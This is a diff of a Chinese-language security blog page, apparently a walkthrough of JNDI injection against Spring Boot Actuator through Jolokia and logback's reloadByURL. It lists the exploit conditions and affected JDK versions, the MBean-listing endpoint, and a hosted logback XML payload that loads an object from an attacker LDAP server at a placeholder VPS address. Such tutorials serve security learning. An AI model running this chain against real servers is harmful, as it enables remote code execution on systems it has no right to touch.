@@ -768,6 +768,7 @@
 <p>3、目标可以请求攻击者的 HTTP 服务器（请求可出外网）</p>
 <p>4、普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201&#x2F;7u191&#x2F;8u182&#x2F;11.0.1(LDAP)，但相关环境可绕过</p>
 <p><strong>查看已存在的 MBeans</strong></p>
+<p>&#x2F;jolokia&#x2F;list</p>
 <p>找到<strong>ch.qos.logback.classic.jmx.JMXConfigurator</strong>和<strong>reloadByURL</strong></p>
 <p><strong>托管xml</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">  &lt;insertFromJNDI env-entry-name=&quot;ldap://your-vps-ip:1389/JNDIObject&quot; as=&quot;appName&quot; /&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>
